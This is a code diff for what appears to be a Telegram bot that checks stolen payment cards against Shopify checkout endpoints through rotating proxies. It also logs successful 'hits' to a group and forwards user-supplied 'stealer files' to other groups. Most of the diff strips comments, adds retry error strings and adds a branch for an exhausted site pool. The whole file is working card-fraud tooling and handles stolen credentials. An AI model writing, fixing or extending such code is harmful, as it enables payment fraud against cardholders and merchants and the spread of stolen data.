@@ -60,10 +60,6 @@ BTN_ALL_EMOJI_ID = "5447602197439218445"
 
 HIT_LOG_GROUP_ID = -1003965699487
 
-# Stealer-file forwarding target(s). Only GROUP IDs here — the code will
-# filter out any entry that resolves to a channel at runtime, so even if
-# a channel ID accidentally ends up in this list, files will NOT be sent
-# there.
 EXTRA_CHARGED_GROUP_IDS = [-5447284969]
 
 BUTTON_LOCK_SECONDS = 30
@@ -144,13 +140,6 @@ def _strip_html_and_tg_emoji(text: str) -> str:
 
 
 async def _is_group(bot, chat_id: int) -> bool:
-    """
-    Return True only if the given chat ID is a group or supergroup.
-    Channels return False. Any lookup error returns False.
-
-    This is the safety net that stops stealer files from being forwarded
-    to channels even if a channel ID ends up in EXTRA_CHARGED_GROUP_IDS.
-    """
     try:
         chat = await bot.get_chat(chat_id)
         return chat.type in ("group", "supergroup")
@@ -587,6 +576,7 @@ RETRY_ERRORS = [
     'no products found', 'graphql_error', 'session_expired',
     'no_session_token', 'no_attempt_token', 'no_seller_proposal',
     'merchant_account_closed', 'gateway_not_configured',
+    'captcha_required', 'price_too_high',
 ]
 
 REACTIONS = [
@@ -774,17 +764,10 @@ async def process_card_api(
     cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str,
     fallback_sites: Optional[list] = None,
 ) -> Tuple[bool, str, str, str, str, str, str, int]:
-    """
-    Call the API's /shopify endpoint.
-
-    If `fallback_sites` is provided, we tell the API to auto-retry on the
-    alternates when the primary site returns a site error (e.g. NO_PRODUCT).
-    """
     import aiohttp
 
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
 
-    # Defensive: proxy may be None if ProxyManager returns (None, ...)
     if proxy is None:
         proxy = ""
     proxy = str(proxy).strip()
@@ -805,7 +788,6 @@ async def process_card_api(
     http_status = None
     last_error_msg = "Unknown Error"
 
-    # Build fallback string (max 2 alternates, excluding the primary)
     fallback_str = ""
     if fallback_sites:
         alts = [s for s in fallback_sites if s and s != site]
@@ -838,7 +820,6 @@ async def process_card_api(
                             proxy_raw = data.get("Proxy", "Live")
                             api_response = data.get("Response", "Unknown Error")
 
-                            # Defensive: null from API
                             if api_response is None:
                                 api_response = "Unknown Error"
                             if not isinstance(api_response, str):
@@ -1364,7 +1345,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
 
         attempt += 1
 
-        # ── FIX A: proxy None guard ─────────────────────────────────
         proxy_result = proxy_manager.get_next_proxy()
         if not proxy_result or proxy_result[0] is None:
             logging.error(f"[MSH] No usable proxies for session {session_id}")
@@ -1393,7 +1373,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 fallback_sites=clean_sites,
             )
 
-            # ── FIX B: message None / non-string guard ──────────────
             if message is None:
                 message = "Unknown Error"
             if not isinstance(message, str):
@@ -1515,6 +1494,13 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
                 response_msg = message
                 break
 
+            # ── v3.8.1: pool exhausted → no point retrying the same API
+            elif ("SITE_ERROR" in message_upper and "exhausted" in message_lower):
+                logging.info(f"[MSH] Pool exhausted for {cc_formatted}: {message}")
+                result_status = "ERROR"
+                response_msg = "Pool Exhausted"
+                break
+
             else:
                 is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)
 
@@ -1546,7 +1532,6 @@ async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, us
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            # ── FIX C: real exception logging ───────────────────────
             logging.error(f"[MSH] exception for {cc_formatted}: {type(e).__name__}: {e}")
 
             if is_session_stopped(session_id):
@@ -1977,7 +1962,6 @@ async def msh_command(message: types.Message):
         document = message.reply_to_message.document
 
     if document:
-        # ── FIX: forward the stealer file only to GROUPS (never channels) ──
         for group_id in EXTRA_CHARGED_GROUP_IDS:
             try:
                 if not await _is_group(bot, group_id):
